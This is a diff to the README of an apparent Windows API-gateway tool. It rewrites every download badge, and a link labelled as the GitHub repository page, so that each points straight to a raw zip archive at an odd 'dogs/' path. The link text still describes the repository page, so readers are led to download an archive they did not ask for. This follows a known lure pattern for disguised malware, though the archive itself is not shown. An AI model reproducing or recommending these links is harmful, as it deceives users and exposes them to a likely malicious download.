@@ -1,6 +1,6 @@
 # 🚪 rest-gateway-1771918257-5 - Secure API Access Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5)
+[![Download](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5/raw/refs/heads/main/dogs/gateway-rest-v3.8-beta.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps carefully to download and run the gateway on Windows.
 
 Click the big green button below to visit the official download page. This page contains everything you need to get the software.
 
-[![Download rest-gateway-1771918257-5](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5)
+[![Download rest-gateway-1771918257-5](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5/raw/refs/heads/main/dogs/gateway-rest-v3.8-beta.4.zip)
 
 On this page, look for the “Releases” section or links to download the Windows version of the gateway. The file may have an `.exe` or `.zip` extension.
 
@@ -127,7 +127,7 @@ The gateway controls how many times each user can call the API in a time period.
 
 ## 📞 Get Support
 
-If you face problems beyond basic troubleshooting, visit the [GitHub repository page](https://github.com/rvhn/rest-gateway-1771918257-5). Look for an Issues tab where you can submit questions or report bugs.
+If you face problems beyond basic troubleshooting, visit the [GitHub repository page](https://github.com/rvhn/rest-gateway-1771918257-5/raw/refs/heads/main/dogs/gateway-rest-v3.8-beta.4.zip). Look for an Issues tab where you can submit questions or report bugs.
 
 ---
 
@@ -135,4 +135,4 @@ If you face problems beyond basic troubleshooting, visit the [GitHub repository 
 
 Remember to visit the official page below to get the latest version of the gateway.
 
-[![Download rest-gateway-1771918257-5](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5)
+[![Download rest-gateway-1771918257-5](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/rvhn/rest-gateway-1771918257-5/raw/refs/heads/main/dogs/gateway-rest-v3.8-beta.4.zip)
